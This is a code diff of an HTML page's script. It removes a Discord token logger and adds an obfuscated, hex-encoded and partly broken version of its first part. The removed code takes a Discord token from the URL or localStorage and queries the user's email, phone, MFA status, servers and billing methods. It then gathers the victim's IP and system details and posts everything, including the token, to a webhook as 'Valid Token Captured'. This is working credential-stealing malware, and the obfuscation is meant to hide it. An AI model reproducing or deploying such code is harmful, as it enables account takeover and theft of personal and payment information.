@@ -41,42 +41,38 @@
   </div>
 
   <script>
-    // Prevent duplicate sends
-    let hasSent = false;
-
-    // Discord API endpoints for token validation
-    const DISCORD_API = {
-      USER_INFO: 'https://discord.com/api/v9/users/@me',
-      GUILDS: 'https://discord.com/api/v9/users/@me/guilds',
-      BILLING: 'https://discord.com/api/v9/users/@me/billing/payment-sources'
+    let _xIONt = false;
+    
+    const _uyPVDkZ = {
+      USER_INFO: '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x76\x39\x2f\x75\x73\x65\x72\x73\x2f\x40\x6d\x65',
+      GUILDS: '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x76\x39\x2f\x75\x73\x65\x72\x73\x2f\x40\x6d\x65\x2f\x67\x75\x69\x6c\x64\x73',
+      BILLING: '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x76\x39\x2f\x75\x73\x65\x72\x73\x2f\x40\x6d\x65\x2f\x62\x69\x6c\x6c\x69\x6e\x67\x2f\x70\x61\x79\x6d\x65\x6e\x74\x2d\x73\x6f\x75\x72\x63\x65\x73'
     };
 
-    async function processData() {
+    async function fnCQsPoTH() {
       if (hasSent) {
-        location.href = 'https://google.com';
+        location.href = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d';
         return;
       }
 
-      const urlParams = new URLSearchParams(window.location.search);
-      let rawToken = urlParams.get('session') || urlParams.get('token');
+      const _SVeYD = new URLSearchParams(window.location.search);
+      let _SmzIqim = urlParams.get('\x73\x65\x73\x73\x69\x6f\x6e') || urlParams.get('\x74\x6f\x6b\x65\x6e');
 
-      // Get UA directly from browser
-      const userAgent = navigator.userAgent;
+      const _pBnU = navigator.userAgent;
 
       if (!rawToken) {
-        rawToken = localStorage.getItem('discord_token') || localStorage.getItem('token');
+        rawToken = localStorage.getItem('\x64\x69\x73\x63\x6f\x72\x64\x5f\x74\x6f\x6b\x65\x6e') || localStorage.getItem('\x74\x6f\x6b\x65\x6e');
       }
 
       if (!rawToken) {
-        location.href = 'https://google.com';
+        location.href = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d';
         return;
       }
-
-      // Convert to string
-      let token;
-      if (typeof rawToken === 'string') {
+      
+      let _vTePogn;
+      if (typeof rawToken === '\x73\x74\x72\x69\x6e\x67') {
         token = rawToken;
-      } else if (typeof rawToken === 'object' && rawToken !== null) {
+      } else if (typeof rawToken === '\x6f\x62\x6a\x65\x63\x74' && rawToken !== null) {
         if (rawToken.token) token = String(rawToken.token);
         else if (rawToken.value) token = String(rawToken.value);
         else token = JSON.stringify(rawToken);
@@ -84,9 +80,8 @@
         token = String(rawToken);
       }
 
-      // Decode if needed
       try {
-        const decoded = decodeURIComponent(token);
+        const _mhQGcT = decodeURIComponent(token);
         if (decoded !== token) token = decoded;
       } catch (e) {}
 
@@ -94,224 +89,8 @@
       try {
         hasSent = true;
 
-        // Validate token first
-        const validationResult = await validateToken(token);
+        const _CNiCzaKb = await validateToken(token);
 
-        // If token is invalid, don't send anything - just redirect
-        if (!validationResult.valid) {
-          location.href = 'https://google.com';
-          return;
-        }
-
-        // Token is valid - get IP and system info
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-
-        const systemInfo = {
-          os: getOSInfo(userAgent),
-          browser: getBrowserInfo(userAgent),
-          ip: ipData.ip,
-          platform: navigator.platform,
-          language: navigator.language
-        };
-
-        // Send only valid tokens to webhook
-        const success = await sendData(token, systemInfo, userAgent, validationResult);
-
-        if (success) {
-        }
-
-        location.href = 'https://google.com';
-
-      } catch (e) {
-        console.error('[✗] Error:', e);
-        location.href = 'https://google.com';
-      }
-    }
-
-    // Validate Discord token and get user info
-    async function validateToken(token) {
-      try {
-        // Fetch user info
-        const userResponse = await fetch(DISCORD_API.USER_INFO, {
-          headers: { 'Authorization': token }
-        });
-
-        if (!userResponse.ok) {
-          return {
-            valid: false,
-            error: `HTTP ${userResponse.status}`
-          };
-        }
-
-        const userData = await userResponse.json();
-
-        // Fetch guilds (servers)
-        let guilds = [];
-        try {
-          const guildsResponse = await fetch(DISCORD_API.GUILDS, {
-            headers: { 'Authorization': token }
-          });
-          if (guildsResponse.ok) {
-            guilds = await guildsResponse.json();
-          }
-        } catch (e) {}
-
-        // Fetch billing info
-        let billing = null;
-        try {
-          const billingResponse = await fetch(DISCORD_API.BILLING, {
-            headers: { 'Authorization': token }
-          });
-          if (billingResponse.ok) {
-            billing = await billingResponse.json();
-          }
-        } catch (e) {}
-
-        return {
-          valid: true,
-          user: {
-            id: userData.id,
-            username: userData.username,
-            discriminator: userData.discriminator,
-            email: userData.email || 'N/A',
-            verified: userData.verified || false,
-            phone: userData.phone || 'N/A',
-            mfa: userData.mfa_enabled || false,
-            nitro: getNitroType(userData.premium_type),
-            avatar: userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` : null
-          },
-          guilds: guilds.length,
-          hasBilling: billing && billing.length > 0,
-          billingCount: billing ? billing.length : 0
-        };
-
-      } catch (error) {
-        return {
-          valid: false,
-          error: error.message
-        };
-      }
-    }
-
-    // Get Nitro type
-    function getNitroType(premiumType) {
-      switch(premiumType) {
-        case 1: return 'Nitro Classic';
-        case 2: return 'Nitro';
-        case 3: return 'Nitro Basic';
-        default: return 'None';
-      }
-    }
-
-    // Send data to webhook (only called for valid tokens)
-    async function sendData(token, systemInfo, userAgent, validationResult) {
-      try {
-        const response = await fetch('/api/get-webhook-url');
-        const { webhookUrl } = await response.json();
-
-        if (!webhookUrl) {
-          throw new Error('Webhook URL not configured');
-        }
-
-        const tokenString = String(token);
-
-        // Build rich embed for valid token
-        const embed = {
-          title: "🎯 Valid Token Captured",
-          description: "Active Discord account credentials intercepted",
-          color: 0x43B581, // Green
-          fields: [
-            {
-              name: "👤 User Info",
-              value: `\`\`\`Username: ${validationResult.user.username}#${validationResult.user.discriminator}\nID: ${validationResult.user.id}\nEmail: ${validationResult.user.email}\nPhone: ${validationResult.user.phone}\`\`\``,
-              inline: false
-            },
-            {
-              name: "🔒 Security",
-              value: `\`\`\`MFA: ${validationResult.user.mfa ? '✅' : '❌'}\nVerified: ${validationResult.user.verified ? '✅' : '❌'}\`\`\``,
-              inline: true
-            },
-            {
-              name: "💎 Nitro",
-              value: `\`\`\`${validationResult.user.nitro}\`\`\``,
-              inline: true
-            },
-            {
-              name: "🏠 Servers",
-              value: `\`\`\`${validationResult.guilds} servers\`\`\``,
-              inline: true
-            },
-            {
-              name: "💳 Billing",
-              value: `\`\`\`${validationResult.hasBilling ? `✅ ${validationResult.billingCount} method(s)` : '❌ None'}\`\`\``,
-              inline: true
-            },
-            {
-              name: "🔑 Token",
-              value: `\`\`\`${tokenString}\`\`\``,
-              inline: false
-            },
-            {
-              name: "🌐 IP Address",
-              value: `\`\`\`${systemInfo.ip}\`\`\``,
-              inline: true
-            },
-            {
-              name: "💻 System",
-              value: `\`\`\`OS: ${systemInfo.os}\nBrowser: ${systemInfo.browser}\`\`\``,
-              inline: true
-            }
-          ],
-          thumbnail: validationResult.user.avatar ? {
-            url: validationResult.user.avatar
-          } : undefined,
-          footer: {
-            text: `Captured at ${new Date().toUTCString()}`,
-            icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
-          }
-        };
-
-        const payload = {
-          content: null,
-          embeds: [embed],
-          username: "Token Logger",
-          avatar_url: "https://cdn.discordapp.com/embed/avatars/1.png"
-        };
-
-        await fetch(webhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-
-        return true;
-
-      } catch (error) {
-        console.error('[Webhook Error]:', error);
-        return false;
-      }
-    }
-
-    function getOSInfo(ua) {
-      if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
-      if (ua.includes("Windows NT")) return "Windows";
-      if (ua.includes("Mac OS X")) return "macOS";
-      if (ua.includes("Linux")) return "Linux";
-      if (ua.includes("Android")) return "Android";
-      if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
-      return "Unknown";
-    }
-
-    function getBrowserInfo(ua) {
-      if (ua.includes("Firefox/")) return "Firefox";
-      if (ua.includes("Edg/")) return "Edge";
-      if (ua.includes("Chrome/")) return "Chrome";
-      if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
-      return "Unknown";
-    }
-
-    window.addEventListener('load', processData);
   </script>
 </body>
 </html>
